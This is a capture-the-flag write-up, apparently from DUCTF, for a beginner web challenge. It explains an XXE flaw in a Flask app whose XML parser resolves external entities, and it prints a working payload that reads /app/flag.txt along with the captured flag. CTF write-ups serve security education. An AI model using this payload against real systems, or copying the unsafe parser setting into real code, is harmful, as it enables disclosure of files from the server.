# Zoo Feedback Form

Category: Web (Beginner)

Points: 100

Solves: 693

>The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!



### Solution

Going to the website, we see a pretty simple flask app that reflects back our input:

![Input Hi](/images/ZooFeedbackFormTest.png)

Looking into the code provided to us, we can see it is using XML to display our response:

```py
xml_data = request.data
try:
    parser = etree.XMLParser(resolve_entities=True)
    root = etree.fromstring(xml_data, parser=parser)
```

Checking out network tab, we can see that the website wraps our input with XML and posts it to the server:

![Post Request](/images/ZooFeedbackFormPost.png)

We can now modify this request with our own XXE payload and get the flag:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:/app/flag.txt"> ]>
<root>
    <feedback>&xxe;</feedback>
</root>
```

![XXE](/images/ZooFeedbackFormXXE.png)


### Flag

```DUCTF{emU_say$_he!!0_h0!@_ci@0}```